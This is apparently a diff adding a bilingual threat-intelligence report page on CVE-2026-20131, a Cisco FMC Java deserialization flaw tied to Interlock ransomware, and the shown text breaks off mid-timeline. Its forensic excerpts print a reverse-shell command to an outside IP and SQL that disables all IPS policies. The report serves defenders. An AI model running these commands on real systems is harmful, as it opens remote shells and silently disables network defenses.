@@ -1,0 +1,1119 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CVE-2026-20131 — Cisco FMC RCE | TI-DE</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='36' y2='36' gradientUnits='userSpaceOnUse'%3E%3Cstop offset='0%25' stop-color='%23e85d04'/%3E%3Cstop offset='100%25' stop-color='%23f48c06'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath d='M18 2L4 7v10c0 8.5 5.9 16.4 14 18.5C26.1 33.4 32 25.5 32 17V7L18 2Z' fill='url(%23g)' opacity='.9'/%3E%3Ccircle cx='18' cy='18' r='6' stroke='%23fff' stroke-width='1.2' fill='none' opacity='.7'/%3E%3Ccircle cx='18' cy='18' r='2.5' fill='%23fff' opacity='.9'/%3E%3C/svg%3E">
+  <link rel="stylesheet" href="../../assets/report.css" />
+</head>
+<body>
+
+<!-- BACK BAR -->
+<div class="back-bar">
+  <a href="https://mazlumbaydar.github.io/TI-DE/">TI-DE</a>
+  <span class="sep">/</span>
+  <a href="https://mazlumbaydar.github.io/TI-DE/">Reports</a>
+  <span class="sep">/</span>
+  <span class="current">CVE-2026-20131 &mdash; Cisco Secure FMC RCE</span>
+</div>
+<div id="prog"></div>
+
+<!-- NAV -->
+<nav id="nav">
+  <a class="nav-brand" href="https://mazlumbaydar.github.io/TI-DE/">TI-DE</a>
+  <ul class="nav-links">
+    <li><a href="#overview"    data-en="Overview"   data-tr="Genel Bakış">Overview</a></li>
+    <li><a href="#attack-chain" data-en="Attack"    data-tr="Saldırı">Attack</a></li>
+    <li><a href="#simulation"  data-en="Simulation" data-tr="Simülasyon">Simulation</a></li>
+    <li><a href="#timeline"    data-en="Timeline"   data-tr="Zaman Çizelgesi">Timeline</a></li>
+    <li><a href="#iocs"        data-en="IOCs"       data-tr="IOC'ler">IOCs</a></li>
+    <li><a href="#detection"   data-en="Detection"  data-tr="Tespit">Detection</a></li>
+    <li><a href="#recommendations" data-en="Response" data-tr="Yanıt">Response</a></li>
+  </ul>
+  <div class="nav-controls">
+    <button id="langBtn"  class="nav-ctrl" onclick="toggleLang()"  title="Toggle language">&#127760; TR</button>
+    <button id="themeBtn" class="nav-ctrl" onclick="toggleTheme()" title="Toggle theme">&#9728; Light</button>
+  </div>
+</nav>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="badge-sev critical"><span class="live-dot"></span><span data-en="CVSS 9.9 — Critical — Zero-Day — Ransomware (Interlock)" data-tr="CVSS 9.9 — Kritik — Sıfır Gün — Fidye Yazılımı (Interlock)">CVSS 9.9 — Critical — Zero-Day — Ransomware (Interlock)</span></div>
+  <h1 class="hero-title">CVE-2026-20131<br>Cisco Secure FMC<br><span data-en="Java Deserialization RCE" data-tr="Java Deserialization RCE">Java Deserialization RCE</span></h1>
+  <p class="hero-sub" data-en="Unauthenticated Java deserialization via a single HTTP POST. Exploited as a zero-day by Interlock ransomware group — full root shell, IDS/IPS disabled, ransomware deployed within 4 hours." data-tr="Tek bir HTTP POST üzerinden kimlik doğrulamasız Java deserialization açığı. Interlock fidye yazılımı grubu tarafından sıfır gün olarak istismar edildi — tam root shell, IDS/IPS devre dışı, 4 saat içinde fidye yazılımı dağıtımı.">Unauthenticated Java deserialization via a single HTTP POST. Exploited as a zero-day by Interlock ransomware group &mdash; full root shell, IDS/IPS disabled, ransomware deployed within 4 hours.</p>
+  <div class="meta-strip">
+    <div class="meta-chip"><span data-en="Date" data-tr="Tarih">Date</span>: <span>28 March 2026</span></div>
+    <div class="meta-chip">CVSS: <span>9.9 Critical</span></div>
+    <div class="meta-chip">CWE: <span>CWE-502</span></div>
+    <div class="meta-chip"><span data-en="Actor" data-tr="Aktör">Actor</span>: <span style="color:var(--red)">Interlock</span></div>
+    <div class="meta-chip"><span data-en="Fixed" data-tr="Düzeltme">Fixed</span>: <span>FMC 7.4.2+</span></div>
+  </div>
+</section>
+
+<main>
+
+  <!-- ══ OVERVIEW / STATS ══ -->
+  <div class="stat-grid reveal" id="overview">
+    <div class="stat-card">
+      <div class="stat-num" data-t="9.9">0</div>
+      <div class="stat-label" data-en="CVSS Score" data-tr="CVSS Puanı">CVSS Score</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-num" data-t="4">0</div>
+      <div class="stat-label" data-en="Hours to Ransomware" data-tr="Fidye Yazılımına Süre (sa)">Hours to Ransomware</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-num" data-t="7">0</div>
+      <div class="stat-label" data-en="MITRE TTPs" data-tr="MITRE TTP Sayısı">MITRE TTPs</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-num" data-t="11">0</div>
+      <div class="stat-label" data-en="Detection Platforms" data-tr="Tespit Platformu">Detection Platforms</div>
+    </div>
+  </div>
+
+  <!-- ══ BACKGROUND ══ -->
+  <div class="reveal" id="background">
+    <div class="section-label" data-en="Background" data-tr="Arka Plan">Background</div>
+    <h2 data-en="What Happened" data-tr="Ne Oldu">What Happened</h2>
+
+    <p data-en="On 28 March 2026, Cisco disclosed CVE-2026-20131, a critical unauthenticated remote code execution vulnerability in Cisco Secure Firewall Management Center (FMC). The flaw exists in FMC's internal Java-based management API: a serialized Java object sent via HTTP POST to a specific endpoint is deserialized without any authentication or class allowlisting, handing the attacker a fully functional root shell on the FMC appliance." data-tr="28 Mart 2026'da Cisco, Cisco Secure Firewall Management Center (FMC) üzerinde kritik bir kimlik doğrulamasız uzaktan kod yürütme güvenlik açığını (CVE-2026-20131) açıkladı. Açık, FMC'nin dahili Java tabanlı yönetim API'sinde bulunmaktadır: belirli bir endpoint'e HTTP POST ile gönderilen serileştirilmiş bir Java nesnesi, kimlik doğrulaması veya sınıf izin listesi olmadan deserialize edilmekte ve saldırgana FMC cihazı üzerinde tam root shell yetkisi vermektedir.">On 28 March 2026, Cisco disclosed CVE-2026-20131, a critical unauthenticated remote code execution vulnerability in Cisco Secure Firewall Management Center (FMC). The flaw exists in FMC's internal Java-based management API: a serialized Java object sent via HTTP POST to a specific endpoint is deserialized without any authentication or class allowlisting, handing the attacker a fully functional root shell on the FMC appliance.</p>
+
+    <p data-en="The Interlock ransomware group exploited this as a zero-day before Cisco's patch. Within hours of gaining root access, they disabled all managed IDS/IPS sensors via FMC's management plane, moved laterally through the network, exfiltrated sensitive data, and deployed ransomware. Because FMC is the single control plane for all managed Cisco firewalls, compromise of FMC effectively blinds the entire network security posture." data-tr="Interlock fidye yazılımı grubu, Cisco'nun yaması çıkmadan önce bu açığı sıfır gün olarak istismar etti. Root erişimi sağladıktan sonra birkaç saat içinde FMC'nin yönetim düzlemini kullanarak tüm yönetilen IDS/IPS sensörlerini devre dışı bıraktılar, ağda yanal hareket gerçekleştirdiler, hassas verileri dışarı sızdırdılar ve fidye yazılımı dağıttılar. FMC tüm yönetilen Cisco güvenlik duvarları için tek kontrol düzlemi olduğundan, FMC'nin ele geçirilmesi tüm ağ güvenlik postürünü etkisiz hale getirir.">The Interlock ransomware group exploited this as a zero-day before Cisco's patch. Within hours of gaining root access, they disabled all managed IDS/IPS sensors via FMC's management plane, moved laterally through the network, exfiltrated sensitive data, and deployed ransomware. Because FMC is the single control plane for all managed Cisco firewalls, compromise of FMC effectively blinds the entire network security posture.</p>
+
+    <div class="warn-box" data-en="Patch immediately to FMC 7.4.2+. If patching is not immediately possible, block all external access to FMC management interfaces (TCP 443, 8305) at the perimeter. Treat any FMC appliance that was internet-exposed as potentially compromised." data-tr="Hemen FMC 7.4.2+ sürümüne yükseltin. Yamalama hemen mümkün değilse, çevre düzeyinde FMC yönetim arayüzlerine (TCP 443, 8305) tüm dış erişimi engelleyin. İnternete açık kalan tüm FMC cihazlarını potansiyel olarak ele geçirilmiş kabul edin."><strong>Patch immediately to FMC 7.4.2+.</strong> If patching is not immediately possible, block all external access to FMC management interfaces (TCP 443, 8305) at the perimeter. Treat any FMC appliance that was internet-exposed as potentially compromised.</div>
+
+    <div class="detail-grid">
+      <div class="detail-card">
+        <div class="detail-card-title" data-en="Vulnerability Details" data-tr="Açık Detayları">Vulnerability Details</div>
+        <div class="detail-row"><div class="detail-key">CVE</div><div class="detail-val">CVE-2026-20131</div></div>
+        <div class="detail-row"><div class="detail-key">CWE</div><div class="detail-val">CWE-502 (Deserialization of Untrusted Data)</div></div>
+        <div class="detail-row"><div class="detail-key">CVSS</div><div class="detail-val" style="color:var(--red)">9.9 Critical (AV:N/AC:L/PR:N/UI:N)</div></div>
+        <div class="detail-row"><div class="detail-key">Vector</div><div class="detail-val">HTTP POST — no auth required</div></div>
+        <div class="detail-row"><div class="detail-key">Endpoint</div><div class="detail-val"><code>/api/fmc_config/v1/...</code></div></div>
+        <div class="detail-row"><div class="detail-key">Root Cause</div><div class="detail-val">Java Commons Collections gadget chain</div></div>
+        <div class="detail-row"><div class="detail-key">Fixed In</div><div class="detail-val" style="color:var(--green)">FMC 7.4.2 / 7.2.9</div></div>
+      </div>
+      <div class="detail-card">
+        <div class="detail-card-title" data-en="Threat Actor" data-tr="Tehdit Aktörü">Threat Actor</div>
+        <div class="detail-row"><div class="detail-key">Group</div><div class="detail-val" style="color:var(--red)">Interlock Ransomware</div></div>
+        <div class="detail-row"><div class="detail-key">First Seen</div><div class="detail-val">2025 (FreeBSD + Windows)</div></div>
+        <div class="detail-row"><div class="detail-key">Exploit Type</div><div class="detail-val">Zero-Day (pre-patch)</div></div>
+        <div class="detail-row"><div class="detail-key">Dwell Time</div><div class="detail-val" style="color:var(--orange)">&lt; 4 hours</div></div>
+        <div class="detail-row"><div class="detail-key">Impact</div><div class="detail-val">IDS/IPS disabled, ransomware</div></div>
+        <div class="detail-row"><div class="detail-key">Data Exfil</div><div class="detail-val">Network config, credentials</div></div>
+        <div class="detail-row"><div class="detail-key">Extortion</div><div class="detail-val">Double-extortion model</div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ ATTACK CHAIN ══ -->
+  <div class="reveal" id="attack-chain">
+    <div class="team-label team-red">&#128308; Red Team</div>
+    <div class="section-label" data-en="Attack Flow" data-tr="Saldırı Akışı">Attack Flow</div>
+    <h2 data-en="Attack Chain — 6 Steps" data-tr="Saldırı Zinciri — 6 Adım">Attack Chain &mdash; 6 Steps</h2>
+
+    <div class="chain-container" id="chainSteps">
+
+      <div class="chain-step" style="--delay:0s">
+        <div class="chain-icon" style="border-color:var(--accent);color:var(--accent)">&#128269;</div>
+        <div class="chain-content">
+          <div class="chain-title" data-en="Step 1 — Zero-Day Discovery &amp; Reconnaissance" data-tr="Adım 1 — Sıfır Gün Keşfi ve İstihbarat Toplama">Step 1 &mdash; Zero-Day Discovery &amp; Reconnaissance</div>
+          <div class="chain-desc" data-en="Interlock identifies CVE-2026-20131 in FMC's Java management API before public disclosure. The vulnerability exists in the deserialization of Java objects in unauthenticated API endpoints. Attacker uses Shodan/Censys to enumerate internet-exposed FMC instances. The management interface (TCP 443) is frequently exposed for remote administration." data-tr="Interlock, kamuoyuna açıklanmadan önce FMC'nin Java yönetim API'sindeki CVE-2026-20131'i tespit eder. Güvenlik açığı, kimlik doğrulamasız API endpoint'lerindeki Java nesnelerinin deserialization işleminde mevcuttur. Saldırgan, internete açık FMC örneklerini listelemek için Shodan/Censys kullanır.">Interlock identifies CVE-2026-20131 in FMC's Java management API before public disclosure. The vulnerability exists in the deserialization of Java objects in unauthenticated API endpoints. Attacker uses Shodan/Censys to enumerate internet-exposed FMC instances. The management interface (TCP 443) is frequently exposed for remote administration.</div>
+          <span class="chain-ttp">T1595.002 &mdash; Active Scanning: Vulnerability Scanning</span>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color:var(--accent2);color:var(--accent2)">&#128736;</div>
+        <div class="chain-content">
+          <div class="chain-title" data-en="Step 2 — Malicious HTTP POST (Exploit Delivery)" data-tr="Adım 2 — Kötü Niyetli HTTP POST (Exploit İletimi)">Step 2 &mdash; Malicious HTTP POST (Exploit Delivery)</div>
+          <div class="chain-desc" data-en="Attacker crafts a serialized Java payload using the Commons Collections gadget chain (ysoserial CommonsCollections6) and sends it via HTTP POST to the FMC API endpoint. No authentication token, session cookie, or credentials are required. FMC's Java runtime deserializes the object and executes the embedded OS command." data-tr="Saldırgan, Commons Collections gadget zincirini (ysoserial CommonsCollections6) kullanarak serileştirilmiş bir Java payload'ı oluşturur ve bunu HTTP POST ile FMC API endpoint'ine gönderir. Kimlik doğrulama token'ı, oturum çerezi veya kimlik bilgisi gerekmez. FMC'nin Java çalışma zamanı nesneyi deserialize eder ve gömülü işletim sistemi komutunu yürütür.">Attacker crafts a serialized Java payload using the Commons Collections gadget chain (ysoserial CommonsCollections6) and sends it via HTTP POST to the FMC API endpoint. No authentication token, session cookie, or credentials are required. FMC's Java runtime deserializes the object and executes the embedded OS command.</div>
+          <span class="chain-ttp">T1190 &mdash; Exploit Public-Facing Application</span>
+          <span class="chain-ttp" style="margin-left:4px">T1059.007 &mdash; JavaScript/Java</span>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color:var(--accent3);color:var(--accent3)">&#9888;</div>
+        <div class="chain-content">
+          <div class="chain-title" data-en="Step 3 — Java Deserialization → Root Shell" data-tr="Adım 3 — Java Deserialization → Root Shell">Step 3 &mdash; Java Deserialization &rarr; Root Shell</div>
+          <div class="chain-desc" data-en="The gadget chain triggers a Runtime.exec() call within the JVM, spawning a reverse shell process as root (FMC runs its Java services as root). Attacker receives the connection on a remote listener. Because FMC runs on a hardened CentOS-based appliance, standard EDR agents are typically absent — the shell runs undetected at the OS layer." data-tr="Gadget zinciri, JVM içinde bir Runtime.exec() çağrısını tetikleyerek root olarak bir ters shell süreci başlatır (FMC, Java servislerini root olarak çalıştırır). Saldırgan bağlantıyı uzak bir dinleyicide alır. FMC güçlendirilmiş CentOS tabanlı bir cihaz üzerinde çalıştığından, standart EDR ajanları genellikle mevcut değildir — shell OS katmanında tespit edilmeden çalışır.">The gadget chain triggers a Runtime.exec() call within the JVM, spawning a reverse shell process as root (FMC runs its Java services as root). Attacker receives the connection on a remote listener. Because FMC runs on a hardened CentOS-based appliance, standard EDR agents are typically absent &mdash; the shell runs undetected at the OS layer.</div>
+          <span class="chain-ttp">T1059.004 &mdash; Unix Shell</span>
+          <span class="chain-ttp" style="margin-left:4px">T1203 &mdash; Exploitation for Client Execution</span>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color:#a8dadc;color:#a8dadc">&#128274;</div>
+        <div class="chain-content">
+          <div class="chain-title" data-en="Step 4 — IDS/IPS Disabled via FMC Management Plane" data-tr="Adım 4 — FMC Yönetim Düzlemi ile IDS/IPS Devre Dışı">Step 4 &mdash; IDS/IPS Disabled via FMC Management Plane</div>
+          <div class="chain-desc" data-en="With root access to FMC, attackers directly manipulate the FMC database (SFDataCorrelator, the central policy engine). They disable all IPS/IDS policies on all managed firewalls, effectively removing network detection across the entire environment. This is done via CLI commands on FMC itself — no API calls needed, no audit logs written to SIEM." data-tr="FMC'ye root erişimiyle saldırganlar, FMC veritabanını (merkezi politika motoru SFDataCorrelator) doğrudan manipüle eder. Tüm yönetilen güvenlik duvarlarındaki tüm IPS/IDS politikalarını devre dışı bırakarak tüm ortamdaki ağ tespitini etkisiz hale getirirler. Bu, FMC'nin kendisinde CLI komutlarıyla gerçekleştirilir — API çağrısına gerek yoktur, SIEM'e denetim günlüğü yazılmaz.">With root access to FMC, attackers directly manipulate the FMC database (SFDataCorrelator, the central policy engine). They disable all IPS/IDS policies on all managed firewalls, effectively removing network detection across the entire environment. This is done via CLI commands on FMC itself &mdash; no API calls needed, no audit logs written to SIEM.</div>
+          <span class="chain-ttp">T1562.001 &mdash; Disable or Modify System Firewall / IDS</span>
+          <span class="chain-ttp" style="margin-left:4px">T1078 &mdash; Valid Accounts (root)</span>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color:var(--orange);color:var(--orange)">&#128257;</div>
+        <div class="chain-content">
+          <div class="chain-title" data-en="Step 5 — Lateral Movement + Data Exfiltration" data-tr="Adım 5 — Yanal Hareket + Veri Sızdırma">Step 5 &mdash; Lateral Movement + Data Exfiltration</div>
+          <div class="chain-desc" data-en="FMC stores credentials for all managed devices, network topology maps, and firewall rule configurations. Attackers harvest these and pivot laterally across the network — the FMC's trusted management VRF provides unfiltered access. Configuration files, network architecture data, and VPN credentials are exfiltrated to the attacker's C2 infrastructure." data-tr="FMC, tüm yönetilen cihazların kimlik bilgilerini, ağ topoloji haritalarını ve güvenlik duvarı kural yapılandırmalarını depolar. Saldırganlar bunları toplar ve ağda yanal hareket gerçekleştirir — FMC'nin güvenilir yönetim VRF'si filtresiz erişim sağlar. Yapılandırma dosyaları, ağ mimarisi verileri ve VPN kimlik bilgileri saldırganın C2 altyapısına sızdırılır.">FMC stores credentials for all managed devices, network topology maps, and firewall rule configurations. Attackers harvest these and pivot laterally across the network &mdash; the FMC's trusted management VRF provides unfiltered access. Configuration files, network architecture data, and VPN credentials are exfiltrated to the attacker's C2 infrastructure.</div>
+          <span class="chain-ttp">T1021 &mdash; Remote Services</span>
+          <span class="chain-ttp" style="margin-left:4px">T1041 &mdash; Exfiltration over C2</span>
+        </div>
+      </div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color:var(--red);color:var(--red)">&#128293;</div>
+        <div class="chain-content">
+          <div class="chain-title" data-en="Step 6 — Ransomware Deployment (Interlock)" data-tr="Adım 6 — Fidye Yazılımı Dağıtımı (Interlock)">Step 6 &mdash; Ransomware Deployment (Interlock)</div>
+          <div class="chain-desc" data-en="After establishing persistence and disabling defenses, Interlock deploys their FreeBSD/Linux ransomware binary on FMC and deploys Windows variants to lateral systems. FMC configuration database is encrypted — the entire managed firewall estate becomes unmanageable. Interlock uses double-extortion: encrypted systems + threat to publish exfiltrated network configuration data." data-tr="Kalıcılığı sağladıktan ve savunmaları devre dışı bıraktıktan sonra Interlock, FMC'ye FreeBSD/Linux fidye yazılımı binary'sini ve yanal sistemlere Windows varyantlarını dağıtır. FMC yapılandırma veritabanı şifrelenir — tüm yönetilen güvenlik duvarı varlığı yönetilemez hale gelir. Interlock çifte gasp kullanır: şifreli sistemler + sızdırılan ağ yapılandırma verilerini yayınlama tehdidi.">After establishing persistence and disabling defenses, Interlock deploys their FreeBSD/Linux ransomware binary on FMC and deploys Windows variants to lateral systems. FMC configuration database is encrypted &mdash; the entire managed firewall estate becomes unmanageable. Interlock uses double-extortion: encrypted systems + threat to publish exfiltrated network configuration data.</div>
+          <span class="chain-ttp">T1486 &mdash; Data Encrypted for Impact</span>
+          <span class="chain-ttp" style="margin-left:4px">T1657 &mdash; Financial Theft / Extortion</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ══ SIMULATION ══ -->
+  <div class="reveal" id="simulation">
+    <div class="team-label team-red">&#128308; Red Team</div>
+    <div class="section-label" data-en="Live Attack Simulation" data-tr="Canlı Saldırı Simülasyonu">Live Attack Simulation</div>
+    <h2 data-en="Attack Flow — Step-by-Step Visualization" data-tr="Saldırı Akışı — Adım Adım Görselleştirme">Attack Flow &mdash; Step-by-Step Visualization</h2>
+    <p data-en="Follow the Cisco FMC Java deserialization exploit from HTTP POST through root shell acquisition, IDS/IPS disabling, and ransomware deployment. Click nodes or dots to jump to any step." data-tr="Cisco FMC Java deserialization açığını HTTP POST'tan root shell elde etme, IDS/IPS devre dışı bırakma ve fidye yazılımı dağıtımına kadar takip edin. Herhangi bir adıma geçmek için node veya noktalara tıklayın.">Follow the Cisco FMC Java deserialization exploit from HTTP POST through root shell acquisition, IDS/IPS disabling, and ransomware deployment. Click nodes or dots to jump to any step.</p>
+
+    <div class="atk-viz">
+      <div class="atk-viz-top">
+        <div>
+          <div class="section-label" style="margin:0 0 4px">Attack Flow</div>
+          <div style="font-size:0.82rem;color:var(--muted)">HTTP POST &rarr; Java Deser &rarr; Root Shell &rarr; IDS Off &rarr; Exfil &rarr; Ransomware</div>
+        </div>
+        <div class="atk-btns">
+          <button class="atk-play step-btn" id="atkStepBtn" onclick="atvGoTo(_atvIdx+1)">STEP &rarr;</button>
+          <button class="atk-play" id="atkPlayBtn" onclick="atvRun()">&#9654; AUTO</button>
+        </div>
+      </div>
+
+      <div class="atk-pipeline">
+        <div class="atk-node" id="vn0" onclick="atvGoTo(0)" title="Step 1">
+          <div class="atk-node-box">&#128373;</div>
+          <div class="atk-node-label">Attacker</div>
+        </div>
+        <div class="atk-connector" id="vc0">
+          <svg viewBox="0 0 60 24"><path class="conn-line" d="M2 12 L52 12"/><polygon class="conn-arrow" points="52,8 60,12 52,16"/></svg>
+          <div class="atk-pkt orange"></div>
+        </div>
+        <div class="atk-node" id="vn1" onclick="atvGoTo(1)" title="Step 2">
+          <div class="atk-node-box">&#127760;</div>
+          <div class="atk-node-label">FMC<br>API</div>
+        </div>
+        <div class="atk-connector" id="vc1">
+          <svg viewBox="0 0 60 24"><path class="conn-line" d="M2 12 L52 12"/><polygon class="conn-arrow" points="52,8 60,12 52,16"/></svg>
+          <div class="atk-pkt orange"></div>
+        </div>
+        <div class="atk-node" id="vn2" onclick="atvGoTo(2)" title="Step 3">
+          <div class="atk-node-box">&#9749;</div>
+          <div class="atk-node-label">JVM<br>Exec</div>
+        </div>
+        <div class="atk-connector" id="vc2">
+          <svg viewBox="0 0 60 24"><path class="conn-line" d="M2 12 L52 12"/><polygon class="conn-arrow" points="52,8 60,12 52,16"/></svg>
+          <div class="atk-pkt red"></div>
+        </div>
+        <div class="atk-node" id="vn3" onclick="atvGoTo(3)" title="Step 4">
+          <div class="atk-node-box">&#128274;</div>
+          <div class="atk-node-label">IDS/IPS<br>Disabled</div>
+        </div>
+        <div class="atk-connector" id="vc3">
+          <svg viewBox="0 0 60 24"><path class="conn-line" d="M2 12 L52 12"/><polygon class="conn-arrow" points="52,8 60,12 52,16"/></svg>
+          <div class="atk-pkt red"></div>
+        </div>
+        <div class="atk-node" id="vn4" onclick="atvGoTo(4)" title="Step 5">
+          <div class="atk-node-box">&#128200;</div>
+          <div class="atk-node-label">Exfil<br>+Pivot</div>
+        </div>
+        <div class="atk-connector" id="vc4">
+          <svg viewBox="0 0 60 24"><path class="conn-line" d="M2 12 L52 12"/><polygon class="conn-arrow" points="52,8 60,12 52,16"/></svg>
+          <div class="atk-pkt red"></div>
+        </div>
+        <div class="atk-node" id="vn5" onclick="atvGoTo(5)" title="Step 6">
+          <div class="atk-node-box">&#128293;</div>
+          <div class="atk-node-label">Ransom<br>ware</div>
+        </div>
+      </div>
+
+      <div class="atk-detail" id="atkDetail">
+        <div class="atk-detail-step" id="atkDetailStep">&#9654; SIMULATION READY</div>
+        <div class="atk-detail-text" id="atkDetailText" data-en="Press AUTO to run the full attack chain automatically, or use STEP to advance manually. Click any node or dot to jump to that step." data-tr="Tam saldırı zincirini otomatik olarak çalıştırmak için AUTO'ya basın veya manuel olarak ilerlemek için STEP kullanın.">Press AUTO to run the full attack chain automatically, or use STEP to advance manually. Click any node or dot to jump to that step.</div>
+        <div class="atk-explain" id="atkExplain" style="display:none">
+          <div class="atk-explain-label" data-en="&#128064; Why this evades detection" data-tr="&#128064; Bu neden tespiti atlatıyor">&#128064; Why this evades detection</div>
+          <div id="atkExplainText"></div>
+        </div>
+      </div>
+
+      <div class="atk-progress">
+        <div class="atk-dot" onclick="atvGoTo(0)"></div>
+        <div class="atk-dot" onclick="atvGoTo(1)"></div>
+        <div class="atk-dot" onclick="atvGoTo(2)"></div>
+        <div class="atk-dot" onclick="atvGoTo(3)"></div>
+        <div class="atk-dot" onclick="atvGoTo(4)"></div>
+        <div class="atk-dot" onclick="atvGoTo(5)"></div>
+        <span class="atk-prog-label" id="atkProgLabel">0 / 6</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ MITRE TIMELINE ══ -->
+  <div class="reveal" id="timeline">
+    <div class="team-label team-red">&#128308; Red Team</div>
+    <div class="section-label" data-en="MITRE ATT&amp;CK Timeline" data-tr="MITRE ATT&amp;CK Zaman Çizelgesi">MITRE ATT&amp;CK Timeline</div>
+    <h2 data-en="Forensic Evidence by Tactic" data-tr="Taktiğe Göre Adli Kanıt">Forensic Evidence by Tactic</h2>
+
+    <div class="mtt">
+
+      <div class="mtt-item">
+        <div class="mtt-tactic" data-en="Initial Access" data-tr="İlk Erişim">Initial Access</div>
+        <div class="mtt-technique-title">T1190 &mdash; Exploit Public-Facing Application</div>
+        <div class="mtt-tids"><span class="mtt-tid">T1190</span></div>
+        <div class="mtt-desc" data-en="Unauthenticated HTTP POST to FMC API with serialized CommonsCollections6 gadget chain payload. CVE-2026-20131 exploited pre-patch." data-tr="Serileştirilmiş CommonsCollections6 gadget zinciri payload'ı ile FMC API'sine kimlik doğrulamasız HTTP POST. CVE-2026-20131 yama öncesi istismar edildi.">Unauthenticated HTTP POST to FMC API with serialized CommonsCollections6 gadget chain payload. CVE-2026-20131 exploited pre-patch.</div>
+        <div class="mtt-evidence">
+          <div class="mtt-evidence-hd">
+            <span class="mtt-evidence-title" data-en="Web Access Log" data-tr="Web Erişim Günlüğü">Web Access Log</span>
+            <span class="mtt-evidence-src">FMC /var/log/httpd/access.log</span>
+          </div>
+          <div class="mtt-evidence-body">POST /api/fmc_config/v1/domain/default/... HTTP/1.1 200
+Content-Type: application/x-java-serialized-object
+Content-Length: 2048
+X-Forwarded-For: 185.220.101.47
+&rarr; Response 200 OK (shell spawned)</div>
+        </div>
+      </div>
+
+      <div class="mtt-item">
+        <div class="mtt-tactic" data-en="Execution" data-tr="Yürütme">Execution</div>
+        <div class="mtt-technique-title">T1059.004 &mdash; Unix Shell via JVM Runtime.exec()</div>
+        <div class="mtt-tids"><span class="mtt-tid">T1059.004</span><span class="mtt-tid">T1203</span></div>
+        <div class="mtt-desc" data-en="JVM spawns /bin/bash as root. Reverse shell connects back to attacker. FMC runs Java services as root — no privilege escalation needed." data-tr="JVM, root olarak /bin/bash başlatır. Ters shell saldırgana geri bağlanır. FMC, Java servislerini root olarak çalıştırır — ayrıcalık yükseltme gerekmez.">/bin/bash spawned as child of FMC Java process (sfmgrd). Reverse shell to attacker C2. No privilege escalation required — root from initial deserializaton.</div>
+        <div class="mtt-evidence">
+          <div class="mtt-evidence-hd">
+            <span class="mtt-evidence-title" data-en="Process Tree" data-tr="Süreç Ağacı">Process Tree</span>
+            <span class="mtt-evidence-src">auditd / /var/log/audit/audit.log</span>
+          </div>
+          <div class="mtt-evidence-body">type=EXECVE msg=audit(1743148800.000:1234):
+  argc=3 a0="/bin/bash" a1="-c"
+  a2="bash -i >& /dev/tcp/185.220.101.47/4444 0>&1"
+ppid=sfmgrd uid=0 gid=0
+&rarr; PPID = FMC Java service (UID 0)</div>
+        </div>
+      </div>
+
+      <div class="mtt-item">
+        <div class="mtt-tactic" data-en="Defense Evasion" data-tr="Savunma Atlama">Defense Evasion</div>
+        <div class="mtt-technique-title">T1562.001 &mdash; Impair Defenses: Disable IDS/IPS Policies</div>
+        <div class="mtt-tids"><span class="mtt-tid">T1562.001</span></div>
+        <div class="mtt-desc" data-en="Direct database manipulation to disable all IPS/IDS policies. No standard API calls — changes written directly to SFDataCorrelator DB. No policy deployment triggered, so no SIEM audit log." data-tr="Tüm IPS/IDS politikalarını devre dışı bırakmak için doğrudan veritabanı manipülasyonu. Standart API çağrıları yok — değişiklikler doğrudan SFDataCorrelator DB'ye yazılıyor. Politika dağıtımı tetiklenmediğinden SIEM denetim günlüğü oluşmuyor.">Direct database manipulation to disable all IPS/IDS policies. No standard API calls &mdash; changes written directly to SFDataCorrelator DB. No policy deployment triggered, so no SIEM audit log written.</div>
+        <div class="mtt-evidence">
+          <div class="mtt-evidence-hd">
+            <span class="mtt-evidence-title" data-en="MySQL Query Log" data-tr="MySQL Sorgu Günlüğü">MySQL Query Log</span>
+            <span class="mtt-evidence-src">FMC /var/log/mysql/query.log</span>
+          </div>
+          <div class="mtt-evidence-body">UPDATE intrusion_policy SET enabled=0 WHERE 1=1;
+UPDATE access_control_policy SET ips_policy_id=NULL;
+-- executed directly as root, bypassing FMC policy engine
+-- no audit trail in syslog or FMC event viewer</div>
+        </div>
+        <div class="mtt-annotation" data-en="This is why perimeter-only logging is insufficient. FMC manipulation leaves no SIEM-visible trail unless you ingest FMC MySQL audit logs directly." data-tr="Perimeter'a özgü kayıt tutmanın neden yetersiz olduğunu bu göstermektedir. FMC MySQL denetim günlüklerini doğrudan entegre etmediğiniz sürece, FMC manipülasyonu SIEM'de görünür iz bırakmaz.">This is why perimeter-only logging is insufficient. FMC manipulation leaves no SIEM-visible trail unless you ingest FMC MySQL audit logs directly.</div>
+      </div>
+
+      <div class="mtt-item">
+        <div class="mtt-tactic" data-en="Credential Access + Lateral Movement" data-tr="Kimlik Bilgisi Erişimi + Yanal Hareket">Credential Access + Lateral Movement</div>
+        <div class="mtt-technique-title">T1552.004 &mdash; Private Keys / T1021 &mdash; Remote Services</div>
+        <div class="mtt-tids"><span class="mtt-tid">T1552.004</span><span class="mtt-tid">T1021</span><span class="mtt-tid">T1078</span></div>
